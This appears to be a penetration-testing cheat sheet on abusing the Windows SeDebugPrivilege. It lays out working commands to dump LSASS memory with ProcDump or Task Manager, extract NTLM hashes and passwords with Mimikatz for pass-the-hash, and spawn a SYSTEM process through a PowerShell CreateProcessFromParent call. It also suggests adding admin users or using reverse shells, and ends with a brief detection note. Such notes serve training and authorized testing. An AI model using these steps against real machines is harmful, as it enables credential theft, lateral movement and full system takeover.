### **Overview**

- _SeDebugPrivilege_ allows a user to debug any process, including those owned by SYSTEM.
- Only administrators have this by default.
- Can be assigned via:
    - **Local/Domain Group Policy**: `Computer Config > Windows Settings > Security Settings`

- Often used by developers; should be assigned sparingly due to its power.

---

### **Use Cases**

- Capturing **LSASS memory** to extract credentials.
- Gaining **remote code execution as SYSTEM**.
- Useful when:
    - User is not admin but has SeDebugPrivilege.
    - RDP or reverse shell is available.

---

### **Credential Dumping with LSASS**

**Check Privileges**:
```bash
whoami /priv
```

Look for:
- `SeDebugPrivilege` — State: Disabled (can still be enabled by elevation)

**Dump LSASS Memory with ProcDump**:
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Parse with Mimikatz**:

```bash
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

- Extract NTLM hashes, usernames, passwords (if stored)
- Use for _pass-the-hash_ lateral movement

**Alternative** (No tool upload):

- RDP into host → Task Manager → `Create dump file` on `lsass.exe`
- Transfer to attack box → Parse with Mimikatz

### **Remote Code Execution as SYSTEM**

**PoC**: Use `CreateProcessFromParent()` to inherit SYSTEM token

- GitHub PoC: [decoder-it/psgetsystem](https://github.com/decoder-it/psgetsystem)

**Steps**:

1. Transfer PoC to host
2. Run in **elevated PowerShell**
3. Get PID of SYSTEM process (e.g., `winlogon.exe`, `lsass.exe`)
4. Execute:
```powershell
[MyProcess]::CreateProcessFromParent(612,"cmd","")
```
**Result**:
- New process runs as `NT AUTHORITY\SYSTEM`


---

### **Tips & Considerations**

- Combine with reverse shell or `net user` command if no GUI access
- SeDebugPrivilege ≠ admin group membership, but offers similar power
- Good alternative if _LSASS dump yields no creds_
- Many PoCs exist; experiment with:
    - Adding local admin user
    - Reverse shells
    - Task scheduling

- Hash-only SYSTEM access (e.g., NTLM) also usable (not covered here)

### **Detection**

- Logon Event ID **4672**: “Special privileges assigned to new logon”
- Indicates sensitive privileges granted to an account
